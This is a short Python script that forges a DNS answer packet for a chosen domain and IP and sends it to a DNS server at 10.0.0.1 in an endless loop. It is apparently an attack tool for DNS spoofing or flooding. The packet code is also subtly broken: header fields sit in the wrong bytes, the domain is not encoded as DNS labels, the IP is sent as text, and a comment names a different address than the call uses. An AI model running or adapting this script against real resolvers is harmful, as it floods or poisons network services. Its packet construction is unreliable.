import socket

def build_dns_replay_packet(domain_name, ip_address):

  # Create a new DNS packet header.
  header = bytearray(12)
  header[0] = 0x85  # Transaction ID.
  header[1] = 0x80  # Flags.
  header[2] = 0x00  # Question count.
  header[3] = 0x01  # Answer count.
  header[4] = 0x00  # Authority count.
  header[5] = 0x00  # Additional count.

  # Create a new DNS question record.
  question = bytearray(domain_name.encode() + b'\x00\x00\x01\x00\x01')

  # Create a new DNS answer record.
  answer = bytearray(domain_name.encode() + b'\x00\x00\x01\x00\x01' + ip_address.encode())

  # Combine the header, question, and answer records into a single packet.
  packet = header + question + answer

  return packet

# Build a DNS replay packet for the domain name "example.com" and the IP address "192.168.1.1".
dns_replay_packet = build_dns_replay_packet("example.com", "10.0.0.12")

# Send the DNS replay packet to the DNS server.
while True:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(dns_replay_packet, ("10.0.0.1", 53))